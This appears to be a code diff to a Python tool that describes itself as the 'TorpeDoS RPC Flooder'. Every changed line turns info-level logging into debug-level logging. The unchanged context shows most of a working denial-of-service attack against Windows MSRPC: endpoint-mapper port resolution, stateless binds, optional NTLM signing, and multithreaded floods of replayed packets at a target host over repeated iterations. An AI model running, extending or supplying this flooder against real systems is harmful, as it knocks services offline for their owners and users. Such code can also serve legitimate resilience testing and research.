@@ -83,7 +83,7 @@ def parse_cli_arguments():
         help="Number of worker threads per stage (default: 16)"
     )
     args = parser.parse_args()
-    logger.info(f"Parsed arguments: target={args.target_host}, replay_count={args.replay_count}, iterations={args.iterations}, workers={args.worker_count}")
+    logger.debug(f"Parsed arguments: target={args.target_host}, replay_count={args.replay_count}, iterations={args.iterations}, workers={args.worker_count}")
     return args
 
 class CustomSigningDCERPC(transport.DCERPC_v5):
@@ -116,7 +116,7 @@ def load_packet_file(file_path):
     Raises:
         ValueError: If UUID or VERSION headers are missing in the file.
     """
-    logger.info(f"Loading packet file: {file_path}")
+    logger.debug(f"Loading packet file: {file_path}")
     interface_uuid = None
     version = None
     requires_authentication = False
@@ -125,20 +125,20 @@ def load_packet_file(file_path):
     for line in file_path.read_text().splitlines():
         if line.startswith("# UUID:"):
             interface_uuid = line.split(":", 1)[1].strip()
-            logger.info(f"Found UUID: {interface_uuid}")
+            logger.debug(f"Found UUID: {interface_uuid}")
         elif line.startswith("# VERSION:"):
             version = line.split(":", 1)[1].strip()
-            logger.info(f"Found version: {version}")
+            logger.debug(f"Found version: {version}")
         elif line.startswith("# AUTH:"):
             requires_authentication = line.split(":", 1)[1].strip().lower() == "yes"
-            logger.info(f"Authentication required: {requires_authentication}")
+            logger.debug(f"Authentication required: {requires_authentication}")
         elif line and not line.startswith("#"):
             packets.append(binascii.a2b_hex(line.strip()))
 
     if not interface_uuid or not version:
         raise ValueError(f"Missing UUID or VERSION header in {file_path}")
     
-    logger.info(f"Loaded {len(packets)} packets from {file_path}")
+    logger.debug(f"Loaded {len(packets)} packets from {file_path}")
     return (interface_uuid, version), requires_authentication, packets
 
 def resolve_rpc_port(server_ip, interface_uuid_bin):
@@ -152,7 +152,7 @@ def resolve_rpc_port(server_ip, interface_uuid_bin):
     Returns:
         str or None: Resolved TCP port as a string, or None if resolution fails.
     """
-    logger.info(f"Resolving RPC port for {server_ip} with UUID {interface_uuid_bin.hex()}")
+    logger.debug(f"Resolving RPC port for {server_ip} with UUID {interface_uuid_bin.hex()}")
     rpc_transport = transport.DCERPCTransportFactory(f"ncacn_ip_tcp:{server_ip}[135]")
     dce = rpc_transport.get_dce_rpc()
     dce.connect()
@@ -161,7 +161,7 @@ def resolve_rpc_port(server_ip, interface_uuid_bin):
             server_ip, interface_uuid_bin, protocol='ncacn_ip_tcp'
         )
         port = binding_string.split("[")[1].rstrip("]")
-        logger.info(f"Resolved RPC port: {port}")
+        logger.debug(f"Resolved RPC port: {port}")
         return port
     except Exception as e:
         logger.error(f"Failed to resolve RPC port: {e}")
@@ -178,7 +178,7 @@ def rpc_stateless_bind(dce, rpc_transport, iface_uuid):
         rpc_transport: Transport object for the connection.
         iface_uuid (bytes): Binary UUID of the target interface.
     """
-    logger.info(f"Initiating stateless bind for interface UUID {iface_uuid.hex()}")
+    logger.debug(f"Initiating stateless bind for interface UUID {iface_uuid.hex()}")
     bind = MSRPCBind()
     ctx = dce._ctx
     item = CtxItem()
@@ -194,7 +194,7 @@ def rpc_stateless_bind(dce, rpc_transport, iface_uuid):
     packet['call_id'] = 1
 
     rpc_transport.send(packet.get_packet())
-    logger.info("Stateless bind packet sent")
+    logger.debug("Stateless bind packet sent")
 
 def replay_packets_for_interface(
     server_ip, rpc_port, interface_info, packet_list,
@@ -219,7 +219,7 @@ def replay_packets_for_interface(
     """
     rpc_sessions = []  # List of (dce, transport) tuples
     signature_map = {}  # socket -> list of signature bytes
-    logger.info(f"Starting replay for interface {interface_info[0]}@v{interface_info[1]}, "
+    logger.debug(f"Starting replay for interface {interface_info[0]}@v{interface_info[1]}, "
                 f"auth={'yes' if requires_authentication else 'no'}, file={packet_filename}, "
                 f"sessions={replay_count}, workers={worker_count}")
 
@@ -316,7 +316,7 @@ def replay_packets_for_interface(
                 ]
             try:
                 sock.send(b"".join(current_packet_list))
-                logger.info(f"Successfully sent {len(current_packet_list)} packets")
+                logger.debug(f"Successfully sent {len(current_packet_list)} packets")
             except Exception as err:
                 logger.error(f"Failed to send packets: {err}")
             with lock:
@@ -332,7 +332,7 @@ def replay_packets_for_interface(
             worker_fn (callable): Worker function to execute.
             args (tuple): Arguments to pass to the worker function.
         """
-        logger.info(f"Starting {count} worker threads for {worker_fn.__name__}")
+        logger.debug(f"Starting {count} worker threads for {worker_fn.__name__}")
         threads = [
             threading.Thread(target=worker_fn, args=args, daemon=True)
             for _ in range(count)
@@ -341,10 +341,10 @@ def replay_packets_for_interface(
             thread.start()
         for thread in threads:
             thread.join()
-        logger.info(f"All {count} worker threads completed")
+        logger.debug(f"All {count} worker threads completed")
 
     # Stage 1: Establish sessions (bind)
-    logger.info("Stage 1: Establishing bind sessions")
+    logger.debug("Stage 1: Establishing bind sessions")
     bind_queue = Queue()
     bind_lock = threading.Lock()
     for _ in range(replay_count):
@@ -356,11 +356,11 @@ def replay_packets_for_interface(
         (bind_queue, bind_bar, bind_lock)
     )
     bind_bar.close()
-    logger.info(f"Established {len(rpc_sessions)} sessions")
+    logger.debug(f"Established {len(rpc_sessions)} sessions")
 
     # Stage 2: Generate signatures (if needed)
     if requires_authentication:
-        logger.info("Stage 2: Generating NTLM signatures")
+        logger.debug("Stage 2: Generating NTLM signatures")
         sign_queue = Queue()
         sign_lock = threading.Lock()
         for session in rpc_sessions:
@@ -372,10 +372,10 @@ def replay_packets_for_interface(
             (sign_queue, sign_bar, sign_lock)
         )
         sign_bar.close()
-        logger.info(f"Generated signatures for {len(signature_map)} sessions")
+        logger.debug(f"Generated signatures for {len(signature_map)} sessions")
 
     # Stage 3: Send RPC calls
-    logger.info("Stage 3: Sending RPC packets")
+    logger.debug("Stage 3: Sending RPC packets")
     call_queue = Queue()
     call_lock = threading.Lock()
     for _, rpc_transport in rpc_sessions:
@@ -388,10 +388,10 @@ def replay_packets_for_interface(
         (signature_map, call_queue, call_bar, call_lock)
     )
     call_bar.close()
-    logger.info(f"Completed sending packets for {len(rpc_sessions)} sessions")
+    logger.debug(f"Completed sending packets for {len(rpc_sessions)} sessions")
 
     # Cleanup: Disconnect sessions
-    logger.info("Cleaning up: Disconnecting sessions")
+    logger.debug("Cleaning up: Disconnecting sessions")
     for _, rpc_transport in rpc_sessions:
         try:
             rpc_transport.disconnect()
@@ -403,11 +403,11 @@ def main():
     """
     Main entry point for the TorpeDoS RPC flooder tool. Coordinates argument parsing, packet loading, port resolution, and attack execution.
     """
-    logger.info("Starting TorpeDoS RPC Flooder")
+    logger.debug("Starting TorpeDoS RPC Flooder")
     start_time = datetime.now()
     args = parse_cli_arguments()
     pkt_file = Path(args.packets_file)
-    logger.info(f"Packet file path: {pkt_file}")
+    logger.debug(f"Packet file path: {pkt_file}")
 
     interface_info, requires_auth, packets = load_packet_file(pkt_file)
     if requires_auth and not (args.username and args.password and args.domain):
@@ -424,7 +424,7 @@ def main():
         return
 
     for i in range(args.iterations):
-        logger.info(f"Starting iteration {i + 1}/{args.iterations}")
+        logger.debug(f"Starting iteration {i + 1}/{args.iterations}")
         replay_packets_for_interface(
             server_ip=args.target_host,
             username=args.username,
@@ -439,11 +439,11 @@ def main():
             packet_filename=pkt_file.name
         )
         if i + 1 != args.iterations:
-            logger.info(f"Waiting {args.delay_between_iterations} seconds before next iteration")
+            logger.debug(f"Waiting {args.delay_between_iterations} seconds before next iteration")
             time.sleep(args.delay_between_iterations)
 
     end_time = datetime.now()
-    logger.info(f"Attack completed. Total duration: {end_time - start_time}")
+    logger.debug(f"Attack completed. Total duration: {end_time - start_time}")
 
 if __name__ == "__main__":
     main()
